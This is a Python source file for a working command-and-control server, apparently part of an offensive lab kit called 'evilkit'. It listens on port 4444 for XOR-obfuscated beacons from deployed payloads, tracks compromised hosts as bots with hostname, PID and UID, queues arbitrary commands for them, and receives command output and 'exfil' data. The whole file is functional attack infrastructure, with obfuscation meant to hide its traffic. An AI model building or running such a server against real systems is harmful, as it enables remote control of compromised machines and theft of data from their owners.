"""Simple TCP C2 server with XOR encoding for evilkit lab runs.

Listens for beacon callbacks from deployed payloads, issues commands,
and logs all interactions. Supports multiple concurrent bots.

Usage:
    python3 c2_server.py --port 4444 --log /tmp/c2.log
"""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import json
import logging
import os
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

XOR_KEY = 0x5A

logger = logging.getLogger("c2_server")


@dataclass
class BotSession:
    bot_id: str
    hostname: str
    pid: int
    uid: int
    address: str
    connected_at: float
    last_beacon: float
    pending_command: str = ""
    command_result: str = ""


@dataclass
class C2State:
    bots: dict[str, BotSession] = field(default_factory=dict)
    command_log: list[dict[str, Any]] = field(default_factory=list)
    total_beacons: int = 0


class C2Server:
    """TCP C2 server with XOR-encoded protocol."""

    def __init__(self, host: str = "0.0.0.0", port: int = 4444, log_path: str | None = None):
        self.host = host
        self.port = port
        self.state = C2State()
        self.log_path = Path(log_path) if log_path else Path("/tmp/c2_server.log")
        self._server: asyncio.Server | None = None

    def _xor_encode(self, data: bytes) -> bytes:
        return bytes(b ^ XOR_KEY for b in data)

    def _xor_decode(self, data: bytes) -> bytes:
        return bytes(b ^ XOR_KEY for b in data)

    def _log(self, event: str, **kwargs) -> dict:
        entry = {"ts": time.time(), "event": event, **kwargs}
        self.state.command_log.append(entry)
        try:
            with open(self.log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except OSError:
            pass
        return entry

    def _make_bot_id(self, hostname: str, pid: int, address: str) -> str:
        raw = f"{hostname}:{pid}:{address}"
        return hashlib.sha256(raw.encode()).hexdigest()[:12]

    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle a single bot connection."""
        peer = writer.get_extra_info("peername")
        peer_addr = f"{peer[0]}:{peer[1]}" if peer else "unknown"
        logger.info(f"Connection from {peer_addr}")
        self._log("connection", address=peer_addr)
        bot_id = None  # initialized for finally block

        try:
            # Read initial beacon (XOR-encoded JSON)
            raw = await asyncio.wait_for(reader.read(4096), timeout=30)
            if not raw:
                logger.warning(f"No data from {peer_addr}")
                return

            try:
                decoded = self._xor_decode(raw).decode("utf-8", errors="replace")
                beacon = json.loads(decoded)
            except (json.JSONDecodeError, UnicodeDecodeError) as e:
                logger.warning(f"Bad beacon from {peer_addr}: {e}")
                writer.write(self._xor_encode(b"ERROR: invalid beacon\n"))
                await writer.drain()
                return

            self.state.total_beacons += 1
            bot_id = self._make_bot_id(
                beacon.get("hostname", "unknown"),
                beacon.get("pid", 0),
                peer_addr,
            )

            session = BotSession(
                bot_id=bot_id,
                hostname=beacon.get("hostname", "unknown"),
                pid=beacon.get("pid", 0),
                uid=beacon.get("uid", 0),
                address=peer_addr,
                connected_at=time.time(),
                last_beacon=time.time(),
            )
            self.state.bots[bot_id] = session
            self._log("beacon", bot_id=bot_id, hostname=session.hostname, pid=session.pid)
            logger.info(f"Bot {bot_id} beacon: {session.hostname} (pid={session.pid})")

            # Send acknowledgement
            ack = json.dumps({"status": "ok", "bot_id": bot_id, "command": "none"})
            writer.write(self._xor_encode(ack.encode()))
            await writer.drain()

            # Wait for next beacon or command result
            while True:
                raw = await asyncio.wait_for(reader.read(4096), timeout=120)
                if not raw:
                    break

                try:
                    decoded = self._xor_decode(raw).decode("utf-8", errors="replace")
                    msg = json.loads(decoded)
                except (json.JSONDecodeError, UnicodeDecodeError):
                    writer.write(self._xor_encode(b"ERROR: invalid message\n"))
                    await writer.drain()
                    continue

                msg_type = msg.get("type", "")

                if msg_type == "beacon":
                    session.last_beacon = time.time()
                    self.state.total_beacons += 1
                    self._log("beacon", bot_id=bot_id)

                    # Issue pending command if any
                    if session.pending_command:
                        cmd = session.pending_command
                        session.pending_command = ""
                        response = json.dumps({"status": "ok", "command": cmd})
                    else:
                        response = json.dumps({"status": "ok", "command": "none"})

                    writer.write(self._xor_encode(response.encode()))
                    await writer.drain()

                elif msg_type == "result":
                    session.command_result = msg.get("output", "")
                    self._log("result", bot_id=bot_id, command=msg.get("command", ""), output_len=len(session.command_result))
                    logger.info(f"Bot {bot_id} result: {msg.get('command', '')} -> {len(session.command_result)} bytes")

                elif msg_type == "exfil":
                    data = msg.get("data", "")
                    self._log("exfil", bot_id=bot_id, data_len=len(data))
                    writer.write(self._xor_encode(json.dumps({"status": "received"}).encode()))
                    await writer.drain()

        except asyncio.TimeoutError:
            logger.info(f"Timeout from {peer_addr}")
        except ConnectionResetError:
            logger.info(f"Reset from {peer_addr}")
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            self._log("disconnect", bot_id=bot_id if bot_id else "unknown", address=peer_addr)

    async def start(self):
        """Start the C2 server."""
        self._server = await asyncio.start_server(
            self.handle_client, self.host, self.port
        )
        addr = self._server.sockets[0].getsockname()
        logger.info(f"C2 server listening on {addr[0]}:{addr[1]}")
        self._log("server_start", host=self.host, port=self.port)

        async with self._server:
            await self._server.serve_forever()

    def issue_command(self, bot_id: str, command: str) -> bool:
        """Queue a command for a specific bot."""
        if bot_id not in self.state.bots:
            return False
        self.state.bots[bot_id].pending_command = command
        self._log("command_issued", bot_id=bot_id, command=command)
        return True

    def list_bots(self) -> list[dict[str, Any]]:
        """List all connected bots."""
        return [
            {
                "bot_id": b.bot_id,
                "hostname": b.hostname,
                "pid": b.pid,
                "uid": b.uid,
                "address": b.address,
                "connected_at": b.connected_at,
                "last_beacon": b.last_beacon,
                "pending_command": b.pending_command or "none",
            }
            for b in self.state.bots.values()
        ]

    def get_logs(self, limit: int = 50) -> list[dict[str, Any]]:
        """Get recent command log entries."""
        return self.state.command_log[-limit:]


def main():
    parser = argparse.ArgumentParser(description="evilkit C2 server")
    parser.add_argument("--host", default="0.0.0.0", help="Listen address")
    parser.add_argument("--port", type=int, default=4444, help="Listen port")
    parser.add_argument("--log", default="/tmp/c2_server.log", help="Log file path")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [C2] %(message)s",
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler(args.log),
        ],
    )

    server = C2Server(host=args.host, port=args.port, log_path=args.log)
    try:
        asyncio.run(server.start())
    except KeyboardInterrupt:
        logger.info("C2 server stopped")


if __name__ == "__main__":
    main()
